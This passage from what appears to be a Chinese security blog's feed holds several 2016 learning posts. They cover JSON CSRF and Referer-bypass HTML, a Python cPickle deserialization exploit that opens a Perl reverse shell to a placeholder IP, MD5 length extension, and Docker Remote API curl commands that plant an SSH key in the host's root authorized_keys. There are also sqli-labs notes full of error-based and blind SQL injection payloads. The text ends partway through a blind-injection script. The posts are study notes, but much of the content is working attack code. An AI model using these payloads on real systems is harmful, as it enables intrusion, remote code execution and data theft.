application/json</code>字段</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;member&#x2F;shop&#x2F;query HTTP&#x2F;1.1Host: example.comContent-Length: 147Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;52.0.2743.116 Safari&#x2F;537.36Content-Type: application&#x2F;json; charset&#x3D;UTF-8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.8Connection: close&#123;&quot;bussid&quot;: 110&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于上面这个请求来说，假设他存在csrf，那么html怎么写？</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&#39;&#123;&quot;bussid&quot;: 1&#125;&#39; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;script&gt;document.forms[0].submit();&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抓包之后可以发现，<code>POST</code>的body数据包是这样的：<code>&#123;&quot;bussid&quot;: 1&#125;=</code>，没看错，后面多了一个等号。为毛会这样子，因为是这样的：</p><blockquote><p>it’s simply the stand delimiter placed in POST request between parameters, which would usually look like this:<br><code>test=x&amp;more=bar</code></p></blockquote><p>肿么绕过去：</p><blockquote><p>an intersting way of getting around this is that <em>some</em> JSON parser accept C stype comments, so you could expand your payload to end in a double slash, effectively commenting out tie equals sign and creating this:<br><code>&#123;&quot;bussid&quot;: 1&#125;//=</code></p></blockquote><p>BUT：</p><blockquote><p>“JSON does not have comments, A JSON encoder MUST NOT output comments, A JSON decodert MAY accept and ignore comments.”</p></blockquote><p>解决方法是这样的，跟sql注入或者xss差不多，要把后面的<code>=</code>号补全，最后就是希望这个填充不会影响到请求。如下</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt;       &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&#39;&#123;&quot;bussid&quot;: 1,&quot;ignore_me&quot;:&quot;&#39;value&#x3D;&#39;test&quot;&#125;&#39; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;script&gt;       document.forms[0].submit();&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多出来的那一段是为了闭合上面的那个<code>=</code>，对于这个请求，其中的body是这个：<br><code>&#123;&quot;bussid&quot;: 1,&quot;ignore_me&quot;:&quot;=test&quot;&#125;</code></p><p>只能希望服务器会丢弃掉多余的JSON，并且这种请求是<code>text/plain</code>格式。</p><p>那么最后的问题来了：</p><pre><code>All that we need to perform a JSON CSRF attack is to submit a valid JSON request using html or a client side code. So, Why cannot we use XMLHTTPRequest object to create a valid JSON request?</code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;ajax.cdnjs.com&#x2F;ajax&#x2F;libs&#x2F;json2&#x2F;20110223&#x2F;json2.js&quot;&gt;&lt;&#x2F;script&gt;if (window.XMLHTTPReuquest)&#123;var xmlhttp&#x3D;new XMLHttpRequest();&#125;else&#123;var xmlhttp&#x3D;new ActiveXObject(&#39;Microsoft.XMLHTTP&quot;);&#125;xmlhttp.open(&quot;POST&quot;, &quot;http:&#x2F;&#x2F;sample.com&quot;, true);xmlhttp.withCredentials&#x3D;&quot;true&quot;;xmlhttp.setRequestHeader(&quot;Content-Type&quot;, &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;);xmlhttp.send(JSON.stringify(&#123;&quot;buddis&quot;: 1&#125;));&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个上面的代码是不会成功的，因为当跨域访问的时候，浏览器会先向这个地址发起一个OPTION请求，询问是否可用，然后再发起实际的请求。会用到以下的header：</p><ul><li><p>Access-Control-Request-Method 和 Access-Control-Allow-Methods：声明所允许及使用的HTTP methods，普通跨域请求只支持GET、HEAD、POST方法，想用其他方法的话，访问需要将<code>Access-Control-Request-Method</code>设置为DELETE等其他方法，然后被请求的网站在Access-Control-Allow-Methods中返回所有支持的方法（用逗号隔开）即可。</p></li><li><p>Access-Control-Request-Headers 和 Access-Control-Allow-Headers：声明所用及允许的的HTTP headers，类似上一组，用于支持其他请求头。</p></li><li><p>Access-Control-Max-Age: 告诉浏览器多长时间内不要发送相同的Preflighted request，直接使用缓存的结果。</p></li></ul><p><a href="https://www.keakon.net/2015/12/06/%E4%B8%8E%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84HTTP%E5%A4%B4">https://www.keakon.net/2015/12/06/%E4%B8%8E%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84HTTP%E5%A4%B4</a></p><p><a href="https://itsecurityconcepts.com/2014/04/22/csrf-on-json-requests/">https://itsecurityconcepts.com/2014/04/22/csrf-on-json-requests/</a></p><h2 id="饶过"><a href="#饶过" class="headerlink" title="饶过"></a>饶过</h2><p>如果防御CSRF的策略是这样的：</p><p>验证Origin或者Referer，如果Referer是空，请求放行。这种防御有个缺陷：</p><p>使用iframe的data协议或者https发起的请求是没有Referer的。</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;    &lt;body&gt;       &lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg&#x3D;&#x3D;&quot;&gt;    &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="http://0x007.blog.51cto.com/6330498/1610946">http://0x007.blog.51cto.com/6330498/1610946</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python cPickle 反序列化shell</title>
      <link href="/2016/07/26/python-cpickle-shell.html"/>
      <url>/2016/07/26/python-cpickle-shell.html</url>
      
        <content type="html"><![CDATA[<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p><blockquote><p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p></blockquote><p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p><p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p><ul><li><a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li></ul><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env pythonimport cPickleimport osimport redisclass exp(object):    def __reduce__(self):        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;        return (os.system, (s,))   e &#x3D; exp()s &#x3D; cPickle.dumps(e)r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5哈希长度扩展攻击</title>
      <link href="/2016/07/25/hash-length-attack.html"/>
      <url>/2016/07/25/hash-length-attack.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p></blockquote><p>这篇文章里有提到的哈希长度扩展攻击看了下做个笔记。理解哈希长度扩展攻击以md5为例，需要理解下面几点：</p><h3 id="MD5的部分工作原理"><a href="#MD5的部分工作原理" class="headerlink" title="MD5的部分工作原理"></a>MD5的<strong>部分工作原理</strong></h3><h4 id="一-先看下MD5的计算过程，只需要理解一半："><a href="#一-先看下MD5的计算过程，只需要理解一半：" class="headerlink" title="一. 先看下MD5的计算过程，只需要理解一半："></a>一. 先看下MD5的计算过程，只需要理解一半：</h4><p> 对于一个message进行md5计算的过程是这样的：<br> 经过三个步骤，这部分可以看<a href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p><p> The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   先进行补位，使得整体长度对512取模之后的值为448，len(message)%512 == 418，计算单位是bit（位）。</p><ol><li><p>Append Padding Bits</p><p> 补位是这样的，先在message后面加0x80标识，然后加无限个0，一直满足对512bit取模之后等于448bit。</p></li><li><p>Append Length</p><p> 512bit和448相差64bit，即8Byte，这个8字节用来表示补位之前message的长度。</p></li><li><p>计算消息摘</p><p>有一个初始链变量，用来参与第一轮的运算，MD5的初始变量为：<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p></li></ol><p> 整体来说就是先补位，然后补长度，这个长度占8Byte，用来表示补位之前message的长度，然后计算md5。现在记住下面这句话：</p><blockquote><p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p></blockquote><p>现在来进行md5扩展长度攻击：<br>我觉得直接把这个看完就差不多了：<a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p><p>骚年我们来翻译下：<br>准备下5个变量：</p><ul><li>secret = <code>secret</code></li><li>data = <code>data</code></li><li>H = md5()</li><li>signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b</li><li>append = <code>append</code> （这个就是我们的payload，换句话说就是攻击的精华啊）</li></ul><p> 服务器发送<code>data</code>和<code>signature</code>给小白，然后小白一看就知道是md5加密（md5加密是128bits，就是16bytes，或者是从源代码推算出来的），现在我们有三个已知：<code>data</code>, <code>加密算法</code>， <code>signature</code>，小白的目标就是把如何把<code>append</code>添加到<code>data</code>，然后产生一个新的data，同时一个新的signature。现在我们来进行md5的计算步骤，不了解的话看看前面。话说那个作者在研究各种hash算法的时候说了这么一句话，这都是人家费了几天时间的，赶紧记下来:</p><pre><code> The endianness of the length field is also important. MD4, MD5, and RIPEMD-160 are little-endian, whereas the SHA family and WHIRLPOOL are big-endian. Trust me, that distinction cost me days of work!</code></pre><p>回到我们的例子来，<code>length(secret || data) = length(&quot;secretdata&quot;)</code>（为毛要这样写呢，因为md5计算里面，后面的pading里有表示message长度的字段），这个总共是10（0x0a）bytes，or 80(0x50)bits。 然后先补位（补到什么时候呢？满足对512bit取模之后等于448bit，也就是总共56Byte，再减去前面10Bytes），也就是补46bytes(80 00 00 00 …)，然后是8 byte的长度字段(50 00 00 00 00 00 00 00)。全部加起来是64bytes, or one block, 这一坨放一起，看起来就是下面这一坨：</p><pre class="line-numbers language-none"><code class="language-none">0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一坨的结构是如下：</p><ul><li>“secret” = <code>secret</code></li><li>“data” = <code>data</code></li><li>80 00 00… The 46 Bytes of padding, start with 0x80</li><li>50 00 00 00 00 00 00 00 – message的长度</li></ul><p>然后小白可以开始attack， Fire The Hole.<br>拿起来我们存半年的append，添加到上面这一坨，添加之后就变成这样了：</p><pre class="line-numbers language-none"><code class="language-none">0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......0040  61 70 70 65 6e 64                                append<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一坨就是最后我们把他返回给服务器的data，<code>data</code>是我们可以控制的。我们继续：<br>服务器接受到上面那坨之后开始计算md5，我们也可以计算这一坨的md5。先说说服务器是怎么算的，简单来说就是直接算：</p><pre class="line-numbers language-none"><code class="language-none">0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......0040  61 70 70 65 6e 64                                append<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>歪果仁给的结果是<code>6ee582a1669ce442f3719c47430dadee</code><br>小白怎么算呢？</p><ul><li>signature = hash(secret || data)<br>现在小白手里有signature，但是小白修改了data啊，小白又不知道secret，只知道secret的长度。</li></ul><blockquote><p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p></blockquote><p>signature可以作为上一次的链变量，只需要从网上找一个md5算法，修改初始的链变量为现在的signature，重新计算下md5，结果就出来了。</p><p>简单来说hash长度扩展攻击就是给数据再加点长度，服务器那边计算哈希值，然后自己又有上一次的哈希结果，自己再算一下就跟服务器的一样了。<br>解决方案就是<code>hash(secret || md5(data))</code>，这么像sql注入发生的危害，用户的输入永远都是危险的。</p><p>配合以下资料看效果更好：</p><ul><li><a href="http://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90">http://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90</a></li><li><a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker Remote API Exploit</title>
      <link href="/2016/05/18/docker-remote-exploit.html"/>
      <url>/2016/05/18/docker-remote-exploit.html</url>
      
        <content type="html"><![CDATA[<p>Source:</p><ul><li><a href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li><li><a href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li></ul><p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p><p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p><p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p><p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p><p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p><p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p><p>然后直接连接就ok:<code>ssh root@10.20.30.40</code></p><blockquote><p>中间主要的坑就是把公钥写入到对应的文件里面，公钥前面要加<code>\</code>转义，并且必须要用双引号把公钥包含起来，创建的时候必须指定image。</p></blockquote><p>参考资料:<a href="https://docs.docker.com/engine/reference/api/docker_remote_api_v1.21/#start-a-container">https://docs.docker.com/engine/reference/api/docker_remote_api_v1.21/#start-a-container</a></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL报错注入</title>
      <link href="/2016/05/05/sqli-labs-less-16.html"/>
      <url>/2016/05/05/sqli-labs-less-16.html</url>
      
        <content type="html"><![CDATA[<h2 id="注入的方法"><a href="#注入的方法" class="headerlink" title="注入的方法"></a>注入的方法</h2><p>   <code>sqli-labs</code>的1，2，3，4课都可以使用以下四种来进行注入数据:</p><ul><li>Union select</li><li>Error based</li><li>Blind based</li><li>Time blind based</li></ul><p>   对应的可以使用<code>sqlmap.py --technique </code>上面首字母大写来指定相应的注入类型。</p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>   第五课首先排除union注入，因为页面无法显示数据，最后我还是看了网页源代码才注入的。</p><blockquote><p> 我发现sqlmap在每次注入的时候都会先尝试确定当前变量是被那种包含，然后在payload里面闭合，这样可以确保整个语句的完整性。 要么确定当前语句完全闭合，要么注释掉后面的语句，确保闭合。</p></blockquote><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>   报错和union查询都出不了数据，只能进行盲注。bool blind和time blind。前面闭合可以使用<code>&#39;</code>或者<code>&#39;)</code>。</p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>   根据页面返回，只能盲注。那么先判断变量是被什么包含的。当输入<code>&#39;</code>的时候页面会改变，在后面加上<code>-- -</code>页面又正常，暂且判断变量是被单引号包含的。然后再这样<code>id=1&#39; and 1=1 -- -1</code>，页面正常，当<code>and</code>后面为<code>1=0</code>的时候页面不正常，所以这里可以变成布尔盲注或者时间盲注。关键点在分析变量是被神码包含。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>   不小心看到了源代码，只能使用时间盲注，这种不管输入什么页面都是这样，可以尝试时间盲注<code>id=1&#39; and if(mid(version(),1,1)=5,sleep(4),0) -- -</code> 。使用<code>sqlmap.py</code>测试结果可以发现可以使用布尔盲注和时间盲注，看了源代码才发现的确可以使用布尔盲注，但是凭肉眼看不到页面的变化。</p><blockquote><p>那么这里是不是就告诉我们，有时候看到的不一定正确还是要采用统计的方法来比较页面的异同。</p></blockquote><p> 这里有个Paper，是使用哪一种算法来检测布尔盲注，sqlmap采用了在去除动态内容之后计算比率的方法,回头需要看下这里的实现方法。</p><ul><li><a href="https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf">https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf</a></li><li><a href="http://zone.wooyun.org/content/26504">http://zone.wooyun.org/content/26504</a></li></ul><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>  在经过less-9被坑了下之后有点慌。到现在基本的测试规则就是先测试被哪种符号闭合，一半来说是这么几个<code>&#39;</code>,<code>&quot;</code>,<code>&#39;)</code>,<code>&quot;)</code>，之后加上测试语句<code>1=1</code>,<code>1=0</code>。看当前页面是否有变化，如果都没有那么就测试时间盲注。</p><p>  Less-10存在时间盲注，使用<code>&quot;</code>闭合，在使用sqlmap之后还存在布尔盲注，果然和less-9一样坑。</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>   网页提示报错注入，在用户名和密码那里可以使用burp截获Post数据。变量是被单引号包含，可以使用union,error,time-based这三种注入。其中time-based的时候有以下个问题:</p><pre class="line-numbers language-none"><code class="language-none"> mysql&gt; select 1&#x3D;0 and if(mid(version(),1,1)&#x3D;5,sleep(5),0);+---------------------------------------------+| 1&#x3D;0 and if(mid(version(),1,1)&#x3D;5,sleep(5),0) |+---------------------------------------------+|                                           0 |+---------------------------------------------+1 row in set (0.00 sec)mysql&gt; select 1&#x3D;0 and (select*from(select sleep(5))x);+-----------------------------------------+| 1&#x3D;0 and (select*from(select sleep(5))x) |+-----------------------------------------+|                                       0 |+-----------------------------------------+1 row in set (5.00 sec)mysql&gt; select mid(version(),1,1);+--------------------+| mid(version(),1,1) |+--------------------+| 5                  |+--------------------+1 row in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当前面条件为假的时候，如果直接使用<code>and if(mid(version(),1,1)=5,sleep(5),0)</code>是不会睡5s。当<code>and</code>替换为<code>xor</code>或者<code>sleep(5)替换为benchmark(1000000,sha1(1))</code>就会发生时间延迟，再或者使用sqlmap的payload：<code>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</code></p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>先判断变量闭合，不管采用<code>&#39; -- -</code>,<code>&quot; -- -</code>,<code>&#39;) -- -</code>,<code>&quot;) -- -</code>，页面都是正常的，后面再加上报错的语句，<code>&quot;)</code>的时候会爆出数据，所以变量是被<code>&quot;)</code>包含的。另外可以使用union,error,time-based这三种。</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>同上，使用<code>&#39;)</code>包含</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>同上，使用<code>&quot;</code>包含</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>只测试了passwd，存在时间盲注，单引号闭合。</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>同上，使用<code>&quot;)</code>包含</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less-1</title>
      <link href="/2016/04/19/sqli-labs-less-1.html"/>
      <url>/2016/04/19/sqli-labs-less-1.html</url>
      
        <content type="html"><![CDATA[<p>  网上关于这个的比较多，第一节课程是单引号注入，一般讲的都比较简单，加一个单引号闭合就行了，但是怎么注入数据呐。因为刚刚开始学，所以我翻了下源代码和数据库，注入出来的payload是这样的：<br><code>2&#39; union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -</code></p><p>简化一下语句是这样的select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id</p><p>union前后的字段数必须一样，union后面的数据可以自己发挥，如何让页面显示注入之后数据可以使用 order by，因为php语句是只显示sql里面第一行结果，所以要让我们注入出来的在第一行显示。 </p><h2 id="Error-based"><a href="#Error-based" class="headerlink" title="Error based"></a>Error based</h2><blockquote><p>首先报错注入要注意闭合语句，比如<code>id=1</code>，如果在PHP里面是这样的<code>select * from users where id=&#39;$id&#39;</code>，其中变量是被单引号包围，在使用报错注入的时候一定要闭合单引号,同理其他符号也是。</p></blockquote><h3 id="BIGINT溢出错误"><a href="#BIGINT溢出错误" class="headerlink" title="BIGINT溢出错误"></a>BIGINT溢出错误</h3><p>上面是union的注入情况，然后是报错注入如下：<br><code>select * from users where id=1 and !(select*from(select user())x)+~0</code><br>地址栏输入这样的语句<br><code>2&#39; and !(select*from(select+user())x)%2b~0</code>(注意单引号闭合，如果没有闭合还是出现正常的结果。</p><pre><code>本文的攻击之所以得逞，是因为mysql_error()会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。</code></pre><p>source:<a href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p><h3 id="EXP溢出错误"><a href="#EXP溢出错误" class="headerlink" title="EXP溢出错误"></a>EXP溢出错误</h3><p><code>http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20exp%28~%28select*from%28select%20user%28%29%29x%29%29%20--%20-</code><br>和上面类似。<br>source:<a href="http://drops.wooyun.org/tips/8166">http://drops.wooyun.org/tips/8166</a></p><p>另外有group by和count冲突，updatexml报错等</p><h3 id="Duplicate-entry-…-’-for-key-‘group-key’"><a href="#Duplicate-entry-…-’-for-key-‘group-key’" class="headerlink" title="Duplicate entry …..’ for key ‘group_key’"></a>Duplicate entry …..’ for key ‘group_key’</h3><p>错误比较经典，地址栏的输入poyload如下：<br><code>and (select 29 from(select count(*),concat(floor(rand(0)*2),user())x from users group by x)a)</code><br>技巧的话就是把<code>floor(rand(0)*2)</code>使用concat把想要爆出的数据连接在一起为某个伪字段，然后<code>group by</code>。<br>报错需要<code>count(*)，rand()、group by</code>，三者缺一不可.具体的原因嘛看下面三个：</p><ul><li><a href="http://rickgray.me/2014/11/16/error-based-sql-injection.html">http://rickgray.me/2014/11/16/error-based-sql-injection.html</a></li><li><a href="http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/">http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/</a></li><li><a href="http://drops.wooyun.org/tips/14312">http://drops.wooyun.org/tips/14312</a></li></ul><p>###extractivalue<br>payload: <code>AND (extractvalue(1,concat(0x7e,(select user()))))</code></p><p>###updatexml<br>payload: <code>and (updatexml (1,concat(0x7e,(select user()),0x73),1))</code></p><p>###GeometryCollection<br>payload: <code>and GeometryCollection((select * from(select * from(select user())a)b))</code></p><p>其他几个好像不经常见，看原网页的记录吧：<br><a href="http://c-chicken.cc/hacking/2016/01/03/Mysql-Error-Sqlinjection.html">http://c-chicken.cc/hacking/2016/01/03/Mysql-Error-Sqlinjection.html</a></p><h2 id="Bool-blind"><a href="#Bool-blind" class="headerlink" title="Bool blind"></a>Bool blind</h2><p>布尔盲注</p><p><code>http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20mid%28%28select%20@@version%29,1,1%29=6%20%20--%20-</code><br>手工参考：<a href="http://www.wooyun.org/bugs/wooyun-2010-017425">http://www.wooyun.org/bugs/wooyun-2010-017425</a><br>判断长度:<code>And (select length(user()))=12</code><br>判断字符:<code>And (select ASCII(SUBSTR(user(),7,1)))&gt;99</code><br>这种可以写个脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># coding:utf-8</span><span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">import</span> sys<span class="token keyword">import</span> random<span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>           <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'</span><span class="token punctuation">&#125;</span>payloads <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789@_.'</span><span class="token keyword">print</span> <span class="token 